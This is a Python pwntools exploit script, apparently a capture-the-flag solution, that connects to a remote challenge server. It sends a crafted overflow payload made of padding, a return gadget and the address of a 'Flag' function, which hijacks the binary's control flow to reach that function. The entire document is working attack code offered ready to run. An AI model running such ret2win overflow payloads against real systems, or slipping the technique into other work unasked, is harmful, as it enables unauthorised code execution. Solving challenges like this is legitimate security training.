#!/usr/bin/env python3

from pwn import *

exe = ELF("./main")

context.binary = exe
context.log_level = "DEBUG"

def conn():
	if False:
		r = process([exe.path])
	else:
		r = remote("challs.htsp.ro", 8004)
	return r


def main():
	r = conn()
	#gdb.attach(r, '''b *_Z16GenerateGreetingci+126''')
	r.sendlineafter(b"character:", b"a")
	r.sendlineafter(b"symbols:", b"AABDDE\x00\x00\x00")
	r.sendafter(b"greeting:", p32(2327) + p32(0) + b"a" * 8 + p64(0x0000000000401016) + p64(exe.symbols['_Z4Flagv']))
	r.interactive()

if __name__ == "__main__":
	main()
